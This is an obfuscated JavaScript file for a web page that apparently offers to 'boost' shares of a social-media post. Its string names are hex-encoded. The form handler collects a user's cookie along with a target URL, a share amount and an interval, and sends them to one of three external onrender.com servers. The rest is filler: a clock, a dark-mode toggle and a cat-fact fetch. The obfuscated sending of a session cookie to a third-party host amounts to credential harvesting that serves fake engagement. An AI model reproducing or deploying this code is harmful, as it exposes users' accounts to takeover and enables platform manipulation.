(function(){
    var _0x1a2f=["\x73\x65\x72\x76\x65\x72\x31","\x73\x65\x72\x76\x65\x72\x32","\x73\x65\x72\x76\x65\x72\x33","\x23\x73\x65\x72\x76\x65\x72\x20\x6F\x70\x74\x69\x6F\x6E\x5B\x76\x61\x6C\x75\x65\x3D\x22","\x22\x5D","\x74\x65\x78\x74\x43\x6F\x6E\x74\x65\x6E\x74","\x73\x70\x6C\x69\x74","\x63\x6F\x6F\x6C\x64\x6F\x77\x6E\x5F","\x73\x65\x74\x49\x74\x65\x6D","\x6C\x6F\x63\x61\x6C\x53\x74\x6F\x72\x61\x67\x65","\x70\x61\x64\x53\x74\x61\x72\x74","\x64\x69\x73\x61\x62\x6C\x65\x64","\x72\x65\x6D\x6F\x76\x65\x49\x74\x65\x6D","\x23\x73\x65\x72\x76\x65\x72","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72\x41\x6C\x6C","\x23\x73\x75\x62\x6D\x69\x74\x2D\x62\x75\x74\x74\x6F\x6E","\x66\x65\x74\x63\x68","\x6F\x6E\x73\x75\x62\x6D\x69\x74","\x70\x72\x65\x76\x65\x6E\x74\x44\x65\x66\x61\x75\x6C\x74","\x72\x65\x73\x70\x6F\x6E\x73\x65","\x6A\x73\x6F\x6E","\x61\x6C\x65\x72\x74","\x73\x74\x79\x6C\x65","\x64\x69\x73\x70\x6C\x61\x79","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E","\x73\x74\x61\x74\x75\x73","\x6D\x65\x73\x73\x61\x67\x65","\x6E\x65\x74\x77\x6F\x72\x6B","\x63\x6F\x6F\x6B\x69\x65","\x75\x72\x6C\x73","\x61\x6D\x6F\x75\x6E\x74\x73","\x69\x6E\x74\x65\x72\x76\x61\x6C\x73","\x73\x65\x72\x76\x65\x72","\x72\x65\x71\x75\x65\x73\x74\x4D\x65\x73\x73\x61\x67\x65","\x72\x65\x73\x70\x6F\x6E\x73\x65\x4D\x6F\x64\x61\x6C","\x66\x6C\x65\x78","\x64\x69\x73\x70\x6C\x61\x79\x3A\x20\x6E\x6F\x6E\x65","\x64\x61\x74\x65\x2D\x74\x69\x6D\x65","\x74\x6F\x4C\x6F\x63\x61\x6C\x65\x53\x74\x72\x69\x6E\x67","\x65\x6E\x2D\x55\x53","\x68\x6F\x75\x72\x31\x32","\x74\x6F\x67\x67\x6C\x65","\x64\x61\x72\x6B\x2D\x6D\x6F\x64\x65","\x6D\x6F\x64\x65\x2D\x73\x77\x69\x74\x63\x68","\x63\x6F\x6E\x74\x61\x69\x6E\x73","\x63\x6C\x69\x63\x6B","\x63\x61\x74\x66\x61\x63\x74\x2D\x74\x65\x78\x74","\x66\x65\x74\x63\x68\x2D\x63\x61\x74\x66\x61\x63\x74\x2D\x62\x75\x74\x74\x6F\x6E","\x6F\x6E\x6C\x6F\x61\x64"];
    const sU={server1:'https://server1-project502.onrender.com',server2:'https://server2-project502.onrender.com',server3:'https://server3-project502.onrender.com'};
    function sC(k,m){let c=Date.now()+m*6e4;localStorage[_0x1a2f[8]](_0x1a2f[7]+k,c);uT(k);}
    function gC(k){let c=parseInt(localStorage.getItem(_0x1a2f[7]+k)||'0');return c-Date.now();}
    function iC(k){return gC(k)>0;}
    function uT(k){
        let o=document.querySelector(_0x1a2f[3]+k+_0x1a2f[4]);
        let b=o[_0x1a2f[5]][_0x1a2f[6]](' (')[0];
        let r=gC(k);
        if(r>0){let m=Math.floor(r/6e4);let s=Math.floor(r%6e4/1e3);o[_0x1a2f[5]]=b+` (cooldown ${m}:${s.toString().padStart(2,'0')})`;o[_0x1a2f[11]]=true;}
        else{o[_0x1a2f[5]]=b+" (active)";o[_0x1a2f[11]]=false;localStorage[_0x1a2f[12]](_0x1a2f[7]+k);}
    }
    function rUI(){[_0x1a2f[0],_0x1a2f[1],_0x1a2f[2]].forEach(k=>uT(k));}
    setInterval(rUI,1e3);
    async function cS(){
        let s=document.querySelectorAll(_0x1a2f[13]+_0x1a2f[14]);
        let a=true;
        let b=document.getElementById(_0x1a2f[15]);
        for(let x of s){
            let k=x.value;
            try{
                let r=await fetch(sU[k]);
                if(r.ok&&!iC(k)){x[_0x1a2f[5]]=x[_0x1a2f[5]][_0x1a2f[6]](' (')[0]+" (active)";x[_0x1a2f[11]]=false;a=false;}
                else if(!iC(k)){x[_0x1a2f[5]]=x[_0x1a2f[5]][_0x1a2f[6]](' (')[0]+" (down)";x[_0x1a2f[11]]=true;}
            }catch{x[_0x1a2f[5]]=x[_0x1a2f[5]][_0x1a2f[6]](' (')[0]+" (down)";x[_0x1a2f[11]]=true;}
        }
        b[_0x1a2f[11]]=a;
    }
    document.getElementById('share-boost-form')[_0x1a2f[17]]=async function(e){
        e[_0x1a2f[18]]();
        let m=document.getElementById(_0x1a2f[35]),msg=document.getElementById(_0x1a2f[34]),url=document.getElementById(_0x1a2f[30]).value,a=parseInt(document.getElementById(_0x1a2f[31]).value),c=document.getElementById(_0x1a2f[29]).value,i=parseInt(document.getElementById(_0x1a2f[32]).value),v=document.getElementById(_0x1a2f[33]).value;
        if(iC(v)){window[_0x1a2f[21]](`This server is on cooldown. Please wait before using it again.`);return;}
        msg[_0x1a2f[5]]='Processing your request, please wait...';m[_0x1a2f[22]][_0x1a2f[23]]='flex';
        try{
            let s=sU[v];
            let r=await fetch(`${s}/api/submit`,{method:'POST',body:JSON.stringify({cookie:c,url:url,amount:a,interval:i}),headers:{[_0x1a2f[24]]:_0x1a2f[25]}});
            let d=await r[_0x1a2f[20]]();
            if(d[_0x1a2f[26]]===200){msg[_0x1a2f[5]]='Your request was submitted successfully!';let cd=v==='server1'?15:20;sC(v,cd);}
            else{msg[_0x1a2f[5]]=`Error: ${d[_0x1a2f[27]]}`;}
        }catch{msg[_0x1a2f[5]]='Network error, please try again.';}
        finally{setTimeout(()=>m[_0x1a2f[22]][_0x1a2f[23]]='none',3e3);}
    };
    function uDT(){
        let d=document.getElementById(_0x1a2f[38]);
        let n=new Date();
        let o={timeZone:'Asia/Manila',hour12:true};
        let t=n[_0x1a2f[39]](_0x1a2f[40],o);
        d[_0x1a2f[5]]=`Date/Time : ${t}`;
    }
    function tDM(){
        document.body[_0x1a2f[41]](_0x1a2f[42]);
        let m=document.getElementById(_0x1a2f[43]);
        m[_0x1a2f[5]]=document.body[_0x1a2f[44]](_0x1a2f[42])?'☀️':'🌙';
    }
    document.getElementById(_0x1a2f[43])[_0x1a2f[45]](_0x1a2f[46],tDM);
    async function fCF(){
        let d=document.getElementById(_0x1a2f[47]);
        d[_0x1a2f[5]]='Fetching cat fact...';
        try{let r=await fetch('https://catfact.ninja/fact');let j=await r[_0x1a2f[20]]();d[_0x1a2f[5]]=j.fact||'Could not fetch a cat fact.';}
        catch{d[_0x1a2f[5]]='An error occurred. Please try again.';}
    }
    document.getElementById(_0x1a2f[48])[_0x1a2f[45]](_0x1a2f[46],fCF);
    window[_0x1a2f[49]]=()=>{cS();uDT();fCF();rUI();};
    setInterval(uDT,1e3);
})();